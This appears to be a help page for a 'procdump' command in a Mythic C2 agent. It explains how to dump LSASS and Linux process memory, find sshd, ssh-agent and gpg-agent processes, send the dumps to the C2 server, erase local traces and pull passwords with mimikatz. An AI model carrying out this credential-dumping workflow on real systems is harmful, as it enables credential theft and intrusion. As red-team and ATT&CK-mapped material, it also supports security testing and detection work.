+++
title = "procdump"
chapter = false
weight = 104
hidden = false
+++

## Summary

Dump process memory for offline credential extraction. Cross-platform:

- **Windows**: Uses `MiniDumpWriteDump` API from `dbghelp.dll` to create a standard minidump file. Supports automatic LSASS discovery.
- **Linux**: Reads `/proc/<pid>/mem` using memory map regions from `/proc/<pid>/maps`. Dumps all readable private regions (heap, stack, anonymous mappings).

Dumps are automatically uploaded to Mythic via the file transfer system and deleted from disk immediately after upload.

### Actions

- **lsass** (Windows only) — Automatically finds `lsass.exe` by process name and dumps its full memory. Primary use case for offline credential extraction.
- **dump** — Dumps any process by PID. Works on both Windows and Linux.
- **search** (Linux only) — Scans `/proc` for processes commonly holding credentials (sshd, ssh-agent, gpg-agent, sudo, etc.) and reports their PID, owner, and estimated memory size.

### Requirements

**Windows:**
- Administrator privileges — SeDebugPrivilege is required to open protected processes
- SYSTEM token recommended — Run `getsystem` first for maximum access
- LSASS may be protected by Protected Process Light (PPL)

**Linux:**
- Root or CAP_SYS_PTRACE capability to read other processes' memory
- `/proc` filesystem must be mounted (standard on all Linux systems)
- Yama ptrace scope may restrict access (`/proc/sys/kernel/yama/ptrace_scope`)

### Arguments

#### action
The dump type to perform.
- `lsass` — (Windows) Auto-find and dump lsass.exe (no PID required)
- `dump` — Dump a specific process by PID (both platforms)
- `search` — (Linux) Find credential-holding processes

#### pid
Process ID to dump. Required for `dump` action.

## Usage

### Windows

Dump LSASS (default):
```
procdump
```

Dump a specific process:
```
procdump -action dump -pid 1234
```

### Linux

Find credential-holding processes:
```
procdump -action search
```

Dump a specific process:
```
procdump -action dump -pid 1234
```

## Example Output

### Windows: Successful LSASS Dump
```
Successfully dumped lsass.exe (PID 964)
Dump size: 78.4 MB
File uploaded to Mythic and cleaned from disk.
```

### Linux: Search Results
```
Found 3 potential credential-holding processes:

  PID 1042     sshd                  Owner: uid=0       Memory: 2.1 MB
               Cmdline: /usr/sbin/sshd -D
  PID 3456     ssh-agent             Owner: uid=1000    Memory: 512.0 KB
               Cmdline: ssh-agent -D -a /run/user/1000/ssh-agent.socket
  PID 7890     gpg-agent             Owner: uid=1000    Memory: 1.3 MB
               Cmdline: /usr/bin/gpg-agent --supervised

Use: procdump -action dump -pid <PID> to dump a specific process.
```

### Linux: Successful Process Dump
```
Successfully dumped sshd (PID 1042)
Dump size: 2.1 MB (15 regions, 2 skipped)
File uploaded to server and cleaned from disk.
```

### Windows: PPL Protected LSASS
```
OpenProcess failed for PID 964 (lsass.exe): Access is denied.
Possible causes:
  - LSASS is running as Protected Process Light (PPL) — check RunAsPPL registry key
  - Credential Guard is enabled
  - Insufficient privileges (need SYSTEM + SeDebugPrivilege)
Tip: Try 'getsystem' first, or dump a non-PPL process with -action dump -pid <PID>
```

## Workflow

### Windows
1. Run `getsystem` to get SYSTEM token
2. Run `procdump` (or `procdump -action lsass`)
3. Download the dump from Mythic Files tab
4. Analyze offline with `mimikatz` (`sekurlsa::minidump dump.dmp` then `sekurlsa::logonPasswords`)

### Linux
1. Ensure root access (or use `sudo`)
2. Run `procdump -action search` to find interesting processes
3. Run `procdump -action dump -pid <PID>` to dump a target
4. Download the dump and search with `strings` or credential extraction tools

## MITRE ATT&CK Mapping

- T1003.001 — OS Credential Dumping: LSASS Memory
- T1003.007 — OS Credential Dumping: Proc Filesystem
